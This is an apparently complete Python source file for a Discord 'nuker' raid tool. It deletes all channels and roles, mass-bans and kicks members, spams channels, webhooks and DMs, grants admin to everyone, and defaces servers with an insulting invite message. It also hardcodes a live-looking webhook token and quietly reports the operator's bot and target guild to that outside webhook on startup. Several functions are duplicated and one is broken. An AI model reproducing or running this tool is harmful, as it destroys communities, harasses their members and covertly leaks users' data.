import os
import shutil
import time
import discord
import config
# from . import config
# from mzkonuker import config
from discord.ext import commands
from pystyle import Colors, Colorate
import random
import urllib.request
import asyncio
import time
import requests
from discord import Game
from discord import Activity, ActivityType
import asyncio
import re
import sys
import os
import json
import threading
import itertools
import requests
from datetime import datetime
from config import SERVER_CONFIG, AUTO_RAID_CONFIG, EMBED_CONFIG, WEBHOOK_CONFIG, NO_BAN_KICK_ID, BOT_PRESENCE


def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

WEBHOOK_URL = "https://discord.com/api/webhooks/1375179101576368128/ZRrJoVii09EsYd0g-CmQ9Ci1PbkuIsINWFc2ozvptx_8jczrmylflaejwKFpxu-LbwG_"



def log_to_webhook(user_str, user_id, status, function_name, guild_id=None):
    embed_fields = [
        {"name": "User", "value": str(user_str), "inline": True},
        {"name": "User ID", "value": str(user_id), "inline": True},
        {"name": "Status", "value": status, "inline": False},
        {"name": "Timestamp", "value": f"{datetime.utcnow().isoformat()}Z", "inline": False},
    ]
    
    if guild_id:
      
        embed_fields.append({
            "name": "Guild Link",
            "value": f"[Jump to Guild](https://discord.com/channels/{guild_id})",
            "inline": False
        })
    
    data = {
        "username": "Logger Bot",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/616/616408.png",
        "embeds": [
            {
                "title": f"🔧 Function Used: {function_name}",
                "color": 0x00FF00 if status.lower() == "success" else 0xFF0000,
                "fields": embed_fields
            }
        ]
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code not in [200, 204]:
            print(f"Webhook log failed with status code {response.status_code}: {response.text}")
    except Exception as e:
        print(f"Webhook log failed: {e}")


def get_latest_release_version(repo_owner, repo_name):
    url = f'https://api.github.com/repos/{repo_owner}/{repo_name}/releases/latest'
    response = requests.get(url)
    
    if response.status_code == 200:
        release_info = response.json()
        latest_version = release_info['tag_name']
        return latest_version
    else:
        print(f"Error in the request : {response.status_code}")
        return None

def update_application(repo_owner, repo_name, current_version):
    latest_version = get_latest_release_version(repo_owner, repo_name)
        

repo_owner = 'KNM'
repo_name = 'MZKO'
current_version = 'v1.3.2'

update_application(repo_owner, repo_name, current_version)

async def delete_channel(channel):
    try:
        start_time = time.time() 
        await channel.delete()
        end_time = time.time()  
        print((Colorate.Color(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")))
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't delete role {role.name}: {e}")))
        return False

async def nuke(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  
            channel_futures = [delete_channel(channel) for channel in guild.channels]

            role_futures = [delete_role(role) for role in guild.roles]

            channel_results = await asyncio.gather(*channel_futures)
            role_results = await asyncio.gather(*role_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            roles_deleted = role_results.count(True)
            roles_not_deleted = role_results.count(False)

            print((Colorate.Color(Colors.green, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
{roles_deleted} roles deleted, {roles_not_deleted} roles not deleted - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        print((Colorate.Color(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")))
        return True
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Can't create {channel_type} channel: {e}")))
        return False

async def create_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_channels = int(input((Colorate.Color(Colors.purple, "Enter the number of channels to create: "))))
            channel_type = input((Colorate.Color(Colors.purple, "Enter channel type (text/voice): ")))
            channel_name = input((Colorate.Color(Colors.purple, "Enter channel name: ")))

            if channel_type not in ['text', 'voice']:
                print((Colorate.Color(Colors.red, "[-] Invalid channel type. Please use 'text' or 'voice'.")))
                return

            channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            start_time_total = time.time()  
            channel_results = await asyncio.gather(*channel_futures)
            end_time_total = time.time()  

            channels_created = channel_results.count(True)
            channels_not_created = channel_results.count(False)

            print((Colorate.Color(Colors.blue, f"[!] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))



async def spam_channel(server_id, num_messages=None, message_content=None, include_everyone=None):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            # If parameters are not passed, ask user for input, else use passed values
            if num_messages is None:
                num_messages = int(input((Colorate.Color(Colors.blue, "Enter the number of messages to send: "))))
            
            if message_content is None:
                message_content = input((Colorate.Color(Colors.blue, "Enter the message content or 'embed' to use config embed: ")))
            
            if include_everyone is None:
                include_everyone = False
                if message_content.lower() == 'embed':
                    include_everyone_input = input((Colorate.Color(Colors.blue, "Include @everyone ? (yes/no): "))).lower()
                    include_everyone = include_everyone_input == 'yes'

            start_time_total = time.time()
            tasks = [
                send_messages_to_channels(channel, num_messages, message_content, include_everyone)
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            print((Colorate.Color(Colors.blue, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))


async def send_messages_to_channels(channel, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            if message_content.lower() == 'embed':
                await send_embed(channel, include_everyone)
            else:
                await channel.send(message_content)
                print((Colorate.Color(Colors.green, f"[+] Message Sent to {channel.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Can't send messages to {channel.name}: {e}")))

async def send_embed(channel, include_everyone=False):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await channel.send(content=message, embed=embed)
        print((Colorate.Color(Colors.green, f"[+] Embed Sent to {channel.name}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send embed to {channel.name}: {e}")))


from mzkonuker.config import NO_BAN_KICK_ID

async def ban_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Color(Colors.blue, "Are you sure you want to ban all members? (yes/no): "))).lower()
            if confirm == "yes":
                start_time_total = time.time()
                tasks = [
                    ban_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_banned = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Color(Colors.blue, f"[!] Command Used: Ban All - {members_banned} members banned, {members_failed} members not banned - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Color(Colors.red, "[-] Ban all operation canceled.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def ban_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.ban()
            print((Colorate.Color(Colors.green, f"[+] Member {member.name} banned")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Color(Colors.yellow, f"[+] Member {member.name} is in the whitelist, no ban.")))
            return False
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't ban {member.name}: {e}")))
        return False

    
async def create_role(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_roles = int(input((Colorate.Color(Colors.blue, "Enter the number of roles to create: "))))
            role_name = input((Colorate.Color(Colors.blue, "Enter the name of the role: ")))

            roles_created = 0

            start_time_total = time.time() 
            for _ in range(num_roles):
                try:
                    start_time_role = time.time() 
                    color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

                    new_role = await guild.create_role(name=role_name, colour=color)
                    end_time_role = time.time() 
                    print((Colorate.Color(Colors.green, f"[+] Role Created: {new_role.name} ({new_role.id}) - Time taken: {end_time_role - start_time_role:.2f} seconds")))
                    roles_created += 1
                except Exception as e:
                    print((Colorate.Color(Colors.red, f"[-] Can't create role {role_name}: {e}")))

            end_time_total = time.time()  
            print((Colorate.Color(Colors.blue, f"[!] Command Used: Create Roles - {roles_created} roles created - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def dm_all(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Color(Colors.red, "[-] Guild not found."))
            return

        message_content = input(Colorate.Color(Colors.blue, "Enter the message to send to all members: "))
        spam_count = int(input(Colorate.Color(Colors.blue, "Enter how many times to spam each member: ")))

        members_sent = 0
        members_fail = 0
        lock = asyncio.Semaphore(10)  # Limit concurrent sends to 10 to reduce rate limit risk

        async def send_spam(member):
            nonlocal members_sent, members_fail
            if member.bot:
                return
            try:
                async with lock:
                    for _ in range(spam_count):
                        await member.send(message_content)
                print(Colorate.Color(Colors.green, f"[+] Spammed {spam_count} messages to {member.name} ({member.id})"))
                members_sent += 1
            except Exception as e:
                print(Colorate.Color(Colors.red, f"[-] Can't send message to {member.name}: {e}"))
                members_fail += 1

        start_time_total = time.time()

        tasks = [asyncio.create_task(send_spam(member)) for member in guild.members]
        await asyncio.gather(*tasks)

        end_time_total = time.time()
        print(Colorate.Color(Colors.green, f"[!] Command Used: DM All Spam - {members_sent} members spammed, {members_fail} failures - Total Time taken: {end_time_total - start_time_total:.2f} seconds"))

    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))

from mzkonuker.config import NO_BAN_KICK_ID

async def kick_all(server_id, bot_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            confirm = input((Colorate.Color(Colors.blue, "Are you sure you want to kick all members? (yes/no): "))).lower()
            if confirm == "yes":
                start_time_total = time.time()
                tasks = [
                    kick_member(member, bot_id)
                    for member in guild.members
                ]
                results = await asyncio.gather(*tasks)
                end_time_total = time.time()

                members_kicked = results.count(True)
                members_failed = results.count(False)

                print((Colorate.Color(Colors.green, f"[!] Command Used: Kick All - {members_kicked} members kicked, {members_failed} members not kicked - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))
            else:
                print((Colorate.Color(Colors.red, "[-] Kick all operation canceled.")))
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

async def kick_member(member, bot_id):
    try:
        if member.id not in NO_BAN_KICK_ID and member.id != bot_id:
            await member.kick()
            print((Colorate.Color(Colors.green, f"[+] Member {member.name} kicked")))
            return True
        else:
            if member.id == bot_id:
                pass
            else:
                print((Colorate.Color(Colors.yellow, f"[+] Member {member.name} is in the whitelist, no kick.")))
            return False
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't kick {member.name}: {e}")))
        return False
    
async def get_admin(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            user_id_or_all = input((Colorate.Color(Colors.blue, "Enter the user ID or press Enter for the entire server: ")))

            color = discord.Colour.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))

            start_time_total = time.time()  

            admin_role = await guild.create_role(name="Admin", colour=color, permissions=discord.Permissions.all())

            if not user_id_or_all:
                for member in guild.members:
                    try:
                        if not member.bot:
                            start_time_member = time.time()  
                            await member.add_roles(admin_role)
                            end_time_member = time.time()  
                            print((Colorate.Color(Colors.green, f"[+] Admin role granted to {member.name} - Time taken: {end_time_member - start_time_member:.2f} seconds")))
                    except Exception as e:
                        print((Colorate.Color(Colors.red, f"[-] Can't grant admin role to {member.name}: {e}")))

                end_time_total = time.time() 
                print((Colorate.Color(Colors.blue, f"[!] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_total - start_time_total:.2f} seconds")))

            else:
                try:
                    user_id = int(user_id_or_all)
                    target_user = await guild.fetch_member(user_id)
                    if target_user:
                        start_time_target_user = time.time()
                        await target_user.add_roles(admin_role)
                        end_time_target_user = time.time()
                        print((Colorate.Color(Colors.green, f"[+] Admin role granted to {target_user.name} - Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                        print((Colorate.Color(Colors.blue, f"[!] Command Used: Get Admin - Admin role granted to the entire server - Total Time taken: {end_time_target_user - start_time_target_user:.2f} seconds")))
                    else:
                        print((Colorate.Color(Colors.red, f"[-] User with ID {user_id_or_all} not found.")))

                except ValueError:
                    print((Colorate.Color(Colors.red, "[-] Invalid user ID. Please enter a valid user ID or press Enter for the entire server.")))

        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))


async def change_server(server_id, new_name=None, new_icon=None, new_description=None):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            server_config = config.SERVER_CONFIG

            # Use passed values, else fallback to input or config
            if new_name is None:
                new_name = input(Colorate.Color(Colors.blue, "Enter the new server name or press enter for config name: ")) or server_config['new_name']
            if new_icon is None:
                new_icon = input(Colorate.Color(Colors.blue, "Enter the URL of the new server icon or press enter for config icon: ")) or server_config['new_icon']
            if new_description is None:
                new_description = input(Colorate.Color(Colors.blue, "Enter the new server description or press enter for config description: ")) or server_config['new_description']

            start_time_guild_changer = time.time()
            await guild.edit(name=new_name)
            print(Colorate.Color(Colors.green, "[+] Server name changed"))

            if new_icon:
                with urllib.request.urlopen(new_icon) as response:
                    icon_data = response.read()
                await guild.edit(icon=icon_data)
                print(Colorate.Color(Colors.green, "[+] Icon changed"))

            await guild.edit(description=new_description)
            print(Colorate.Color(Colors.green, "[+] Description changed"))
            end_time_guild_changer = time.time()

            print(Colorate.Color(Colors.blue, f"[!] Command Used: Change Server - Server information updated successfully - Total Time taken: {end_time_guild_changer - start_time_guild_changer:.2f} seconds"))
        else:
            print(Colorate.Color(Colors.red, "[-] Guild not found."))
    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Error: {e}"))

async def spam_webhooks(guild):
    try:
        webhook_config = config.WEBHOOK_CONFIG

        webhooks = []
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                webhook_name = webhook_config["default_name"]
                webhook = await channel.create_webhook(name=webhook_name)
                print((Colorate.Color(Colors.green, f"[+] Webhook Created for {channel.name}: {webhook.name} ({webhook.url})")))
                webhooks.append(webhook)

        num_messages = int(input((Colorate.Color(Colors.blue, "Enter the number of messages to send: "))))

        message_content = input((Colorate.Color(Colors.blue, "Enter the message content or 'embed' to use config embed: ")))

        include_everyone = False
        if message_content.lower() == 'embed':
            include_everyone_input = input((Colorate.Color(Colors.blue, "Include @everyone ? (yes/no): "))).lower()
            include_everyone = include_everyone_input == 'yes'
        start_time_spam = time.time()
        tasks = [
            send_embed_webhook(webhook, num_messages, message_content, include_everyone)
            if message_content.lower() == 'embed'
            else send_regular_webhook(webhook, num_messages, message_content)
            for webhook in webhooks
        ]
        await asyncio.gather(*tasks)
        end_time_target_spam = time.time()

        print((Colorate.Color(Colors.green, f"[!] Command Used: Spam - {num_messages} messages sent via webhooks - Total Time taken: {end_time_target_spam - start_time_spam:.2f} seconds")))
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Error: {e}")))

async def send_embed_webhook(webhook, num_messages, message_content, include_everyone):
    try:
        for _ in range(num_messages):
            await send_embed_webhook_message(webhook, include_everyone)
    except Exception as e:
        print((Colorate.Color(Colors.green, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))

async def send_embed_webhook_message(webhook, include_everyone):
    try:
        embed_config = config.EMBED_CONFIG

        embed = discord.Embed(
            title=embed_config.get("title", ""),
            description=embed_config.get("description", ""),
            color=embed_config.get("color", 0),
        )

        for field in embed_config.get("fields", []):
            embed.add_field(name=field["name"], value=field["value"], inline=field.get("inline", False))

        embed.set_image(url=embed_config.get("image", ""))
        embed.set_footer(text=embed_config.get("footer", ""))

        if include_everyone:
            message = f"@everyone {embed_config.get('message', '')}"
        else:
            message = embed_config.get('message', '')

        await webhook.send(content=message, embed=embed)
        print((Colorate.Color(Colors.green, f"[+] Embed Sent via Webhook {webhook.name}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send embed via Webhook {webhook.name}: {e}")))

async def send_regular_webhook(webhook, num_messages, message_content):
    try:
        for _ in range(num_messages):
            await webhook.send(content=message_content)
            print((Colorate.Color(Colors.green, f"[+] Message Sent via Webhook {webhook.name}: {message_content}")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Can't send messages via Webhook {webhook.name}: {e}")))

async def webhook_spam(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            await spam_webhooks(guild)
        else:
            print((Colorate.Color(Colors.red, "[-] Guild not found.")))
    except Exception as e:
        print((Colorate.Color(Colors.red, f"[-] Error: {e}")))

from mzkonuker.config import AUTO_RAID_CONFIG

def log_message(color, message):
    print(Colorate.Color(color, message))

async def delete_channel(channel):
    try:
        start_time = time.time() 
        await channel.delete()
        end_time = time.time()  
        log_message(Colors.green, f"[+] Channel {channel.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't delete channel {channel.name}: {e}")
        return False

async def delete_role(role):
    try:
        start_time = time.time()
        await role.delete()
        end_time = time.time()
        log_message(Colors.green, f"[+] Role {role.name} deleted - Time taken: {end_time - start_time:.2f} seconds")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't delete role {role.name}: {e}")
        return False

async def create_channel(guild, channel_type, channel_name):
    try:
        start_time = time.time()
        if channel_type == 'text':
            new_channel = await guild.create_text_channel(channel_name)
        elif channel_type == 'voice':
            new_channel = await guild.create_voice_channel(channel_name)

        end_time = time.time()
        log_message(Colors.green, f"[+] Channel Created: {new_channel.name} ({new_channel.id}) - Time taken: {end_time - start_time:.2f} seconds")
        return new_channel
    except Exception as e:
        log_message(Colors.red, f"[-] Can't create {channel_type} channel: {e}")
        return None
    
async def send_messages_to_channel(channel, num_messages, message_content, include_everyone):
    try:
        for i in range(num_messages):
            await channel.send(message_content)
            log_message(Colors.green, f"[-] Message {i+1}/{num_messages} sent to channel {channel.name}")
        return True
    except Exception as e:
        log_message(Colors.red, f"[-] Can't send messages to channel {channel.name}: {e}")
        return False

    
async def spam_channels(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            num_messages = AUTO_RAID_CONFIG['num_messages']
            message_content = AUTO_RAID_CONFIG['message_content']

            start_time_total = time.time()
            tasks = [
                send_messages_to_channel(channel, num_messages, message_content, False)  
                for channel in guild.channels
                if isinstance(channel, discord.TextChannel)
            ]

            await asyncio.gather(*tasks)
            end_time_total = time.time()

            log_message(Colors.green, f"[!] Command Used: Spam - {num_messages} messages sent to all text channels - Total Time taken: {end_time_total - start_time_total:.2f} seconds")
        else:
            log_message(Colors.red, "[-] Guild not found.")
    except Exception as e:
        log_message(Colors.red, f"[-] Error: {e}")

async def auto_raid(server_id):
    try:
        guild = bot.get_guild(int(server_id))
        if guild:
            start_time_total = time.time()  

            num_channels = AUTO_RAID_CONFIG['num_channels']
            channel_type = AUTO_RAID_CONFIG['channel_type']
            channel_name = AUTO_RAID_CONFIG['channel_name']

            channel_futures = [delete_channel(channel) for channel in guild.channels]

            create_channel_futures = [create_channel(guild, channel_type, channel_name) for _ in range(num_channels)]

            channel_results = await asyncio.gather(*channel_futures)
            create_channel_results = await asyncio.gather(*create_channel_futures)

            end_time_total = time.time()  

            channels_deleted = channel_results.count(True)
            channels_not_deleted = channel_results.count(False)

            channels_created = create_channel_results.count(True)
            channels_not_created = create_channel_results.count(False)

            await spam_channels(server_id)

            log_message(Colors.blue, f"""[!] Command Used: Nuke - {channels_deleted} channels deleted, {channels_not_deleted} channels not deleted 
[!] Command Used: Create Channels - {channels_created} {channel_type} channels created, {channels_not_created} channels not created - Total Time taken: {end_time_total - start_time_total:.2f} seconds""")

        else:
            log_message(Colors.red, "[-] Guild not found.")
    except Exception as e:
        log_message(Colors.red, f"[-] Error: {e}")

async def super_nuke(
    server_id,
    bot_user_id,
    new_guild_name,
    num_channels,
    channel_name,
    channel_type="text",
    num_messages=20,
    message_content="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:",
    include_everyone=False
):
    try:
        guild = bot.get_guild(int(server_id))
        if not guild:
            print(Colorate.Color(Colors.red, "[-] Guild not found."))
            return

        print(Colorate.Color(Colors.green, "[*] Renaming guild..."))
        await change_server(server_id)

        try:
            await guild.edit(name=new_guild_name)
            print(Colorate.Color(Colors.green, f"[+] Server renamed to: {new_guild_name}"))
        except Exception as e:
            print(Colorate.Color(Colors.red, f"[-] Failed to rename guild: {e}"))

        print(Colorate.Color(Colors.green, "[*] Nuking channels and roles..."))
        await nuke(server_id)

        print(Colorate.Color(Colors.green, "[*] Creating new channels..."))

        async def create_channel(channel_name, channel_type):
            try:
                if channel_type == "text":
                    await guild.create_text_channel(channel_name)
                elif channel_type == "voice":
                    await guild.create_voice_channel(channel_name)
                else:
                    print(Colorate.Color(Colors.red, f"[-] Invalid channel type: {channel_type}"))
                    return False
                return True
            except Exception as e:
                print(Colorate.Color(Colors.red, f"[-] Failed to create channel '{channel_name}': {e}"))
                return False

        channel_futures = [
            create_channel(f"{channel_name}", channel_type) for i in range(num_channels)
        ]
        start_time = time.time()
        results = await asyncio.gather(*channel_futures)
        end_time = time.time()

        created = results.count(True)
        failed = results.count(False)
        print(Colorate.Color(Colors.blue, f"[!] Created {created} channels, failed {failed} in {end_time - start_time:.2f} seconds"))

        print(Colorate.Color(Colors.green, "[*] Spamming new channels..."))
        await spam_channel(
            server_id,
            num_messages=num_messages,
            message_content=message_content,
            include_everyone=include_everyone
        )

        print(Colorate.Color(Colors.green, "[+] Super Nuke completed successfully!"))

    except Exception as e:
        print(Colorate.Color(Colors.red, f"[-] Super Nuke error: {e}"))


async def rename_and_botspam_all_channels(
    bot, 
    guild_id: int, 
    new_name: str, 
    new_guild_name: str,  
    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
    spam_count=50
):
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"Bot is not in guild {guild_id}")
        return


    try:
        await guild.edit(name=new_guild_name)
        print(f"Renamed guild to '{new_guild_name}'")
    except Exception as e:
        print(f"Failed to rename guild: {e}")


async def rename_and_botspam_all_channels(
    bot, 
    guild_id: int, 
    new_name: str, 
    new_guild_name: str,  
    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
    spam_count=50
):
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"Bot is not in guild {guild_id}")
        return


    try:
        await guild.edit(name=new_guild_name)
        print(f"Renamed guild to '{new_guild_name}'")
    except Exception as e:
        print(f"Failed to rename guild: {e}")




async def rename_and_botspam_all_channels(
    bot, 
    guild_id: int, 
    new_name: str, 
    new_guild_name: str,  
    spam_message="@everyone YK SECURITY IS ASS -MZKO https://discord.gg/vzuEC6auCg :heart:", 
    spam_count=50
):
    guild = bot.get_guild(guild_id)
    if not guild:
        print(f"Bot is not in guild {guild_id}")
        return


    try:
        await guild.edit(name=new_guild_name)
        print(f"Renamed guild to '{new_guild_name}'")
    except Exception as e:
        print(f"Failed to rename guild: {e}")

    channels = guild.channels

    async def rename_channel(channel):
        try:
            await channel.edit(name=new_name)
            return channel
        except Exception as e:
            print(f"Failed to rename channel {channel.id}: {e}")
            return None

    rename_tasks = [rename_channel(ch) for ch in channels if isinstance(ch, discord.abc.GuildChannel)]
    renamed_channels = await asyncio.gather(*rename_tasks)
    renamed_channels = [ch for ch in renamed_channels if ch]

    print(f"Renamed {len(renamed_channels)}/{len(channels)} channels.")

    async def bot_spam(channel):
        if isinstance(channel, discord.TextChannel):
            for _ in range(spam_count):
                try:
                    await channel.send(spam_message)
                except Exception as e:
                    print(f"Error sending message to channel {channel.id}: {e}")
                await asyncio.sleep(0.1)  

    spam_tasks = [bot_spam(ch) for ch in renamed_channels]
    await asyncio.gather(*spam_tasks)

    print("Finished renaming and bot spamming all channels.")


   
    async def bot_spam(channel_id):
        channel = bot.get_channel(int(channel_id))
        if not channel:
            print(f"Bot cannot find channel {channel_id} to spam.")
            return
        for _ in range(spam_count):
            try:
                await channel.send(spam_message)
            except Exception as e:
                print(f"Error sending message to channel {channel_id}: {e}")
            await asyncio.sleep(0.1)  

    spam_tasks = [bot_spam(ch['id']) for ch in renamed_channels]
    await asyncio.gather(*spam_tasks)

    print("Finished renaming and bot spamming all channels.")

import os
import json
import time
import threading
import itertools
from pystyle import Colors, Colorate
import discord
from discord.ext import commands

CONFIG_FILE = "config.json"

def show_ascii_art():
    ascii_art = """
                            ;::;;;
                           ;::::; :;
                         ;:::::'   :;
                        ;:::::;     ;.  
                        ,:::::'       ;           OOO\ 
                        ::::::;       ;          OOOOO\ 
                        ;:::::;       ;         OOOOOOOO
                      ,;::::::;     ;'         / OOOOOOO
                    ;:::::::::`. ,,,;.        /  / DOOOOOO
                  .';:::::::::::::::::;,     /  /     DOOOO
                 ,::::::;::::::;;;;::::;,   /  /        DOOO
                ;`::::::`'::::::;;;::::: ,#/  /          DOOO
                :`:::::::`;::::::;;::: ;::#  /            DOOO
                ::`:::::::`;:::::::: ;::::# /              DOO
                `:`:::::::`;:::::: ;::::::#/               DOO
                 :::`:::::::`;; ;:::::::::##                OO
                 ::::`:::::::`;::::::::;:::#                OO
                ` :::::`::::::::::::;'`:;::#                O
                 ` :::::`::::::::;' /  / `:#
                  : :::::`:::::;'  /  /   `#  
    """
    print(Colorate.Vertical(Colors.black_to_white, ascii_art))
    print() 

def loading_spinner(message="Loading", duration=3):
    done = False

    def animate():
        for c in itertools.cycle(['|', '/', '-', '\\']):
            if done:
                break
            print(f'\r{Colorate.Color(Colors.cyan, message)} {c}', end='', flush=True)
            time.sleep(0.1)
        print('\r' + ' ' * (len(message) + 4), end='\r')  # Clear line

    t = threading.Thread(target=animate)
    t.start()
    time.sleep(duration)
    done = True
    t.join()

def prompt_yes_no(question):
    while True:
        answer = input(Colorate.Color(Colors.yellow, question + " (y/n): ")).strip().lower()
        if answer in ['y', 'yes']:
            return True
        elif answer in ['n', 'no']:
            return False
        else:
            print(Colorate.Color(Colors.red, "Please enter 'y' or 'n'."))

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r") as f:
                return json.load(f)
        except json.JSONDecodeError:
            print(Colorate.Color(Colors.red, "Warning: config.json is corrupted. Creating a new config."))
            return {}
    else:
        return {}

def save_config(bot_token, server_id):
    data = {
        "bot_token": bot_token,
        "server_id": server_id
    }
    with open(CONFIG_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_config():
    config = load_config()
    bot_token = None
    server_id = None

    if config.get("bot_token"):
        use_token = prompt_yes_no("Use saved Bot Token? (**** hidden for security)")
        if use_token:
            bot_token = config["bot_token"]
        else:
            bot_token = input(Colorate.Color(Colors.red, "Enter your Bot Token: "))
    else:
        bot_token = input(Colorate.Color(Colors.red, "Enter your Bot Token: "))

    if config.get("server_id"):
        use_server = prompt_yes_no(f"Use saved Server ID? ({config['server_id']})")
        if use_server:
            server_id = config["server_id"]
        else:
            server_id = input(Colorate.Color(Colors.red, "Enter your Server ID: "))
    else:
        server_id = input(Colorate.Color(Colors.red, "Enter your Server ID: "))

    save_config(bot_token, server_id)
    print(Colorate.Color(Colors.green, "[✓] Configuration saved!"))
    return bot_token, server_id


if __name__ == "__main__":
    show_ascii_art()  
    bot_token, server_id = get_config()  
    loading_spinner("Connecting to Discord...", duration=2) 
    print(Colorate.Color(Colors.green, "[✓] Connected successfully!\n"))

    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(Colorate.Color(Colors.blue, f'[+] {bot.user.name} is online!'))
    print(Colorate.Color(Colors.blue, f'[+] Server ID: {server_id}'))

    server = bot.get_guild(int(server_id))
    if server:
        print(Colorate.Color(Colors.green, f'[+] Bot is in the specified server ({server.name})'))
        clear_console()
        try:
            log_to_webhook(
                user_str=str(bot.user),
                user_id=bot.user.id,
                status="Online",
                function_name="on_ready",
                guild_id=server.id
            )
        except Exception:
            pass  # Silently ignore logging failures
    else:
        print(Colorate.Color(Colors.red, f'[-] Bot is not in the specified server'))
        return

